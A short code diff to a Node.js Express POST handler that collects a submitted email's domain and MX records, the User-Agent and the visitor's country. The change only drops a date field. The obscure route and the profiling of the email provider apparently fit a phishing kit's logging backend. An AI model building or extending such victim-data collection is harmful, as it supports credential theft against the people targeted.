@@ -43,7 +43,6 @@ app.post("/UD92290", async (req, res) => {
     const user_agent = req.header("User-Agent")
     const domain = session_key.split("@")[1]
 
-    const date = new Date().toDateString()
     const time = new Date().toTimeString()
     const mx = await dnsPromises.resolveMx(`${domain}`);
 
@@ -58,7 +57,6 @@ app.post("/UD92290", async (req, res) => {
       country_name: gottenAddress.countryName,
       country_code: gottenAddress.countryCode,
       user_agent: user_agent,
-      date: date,
       time: time,
     }
 
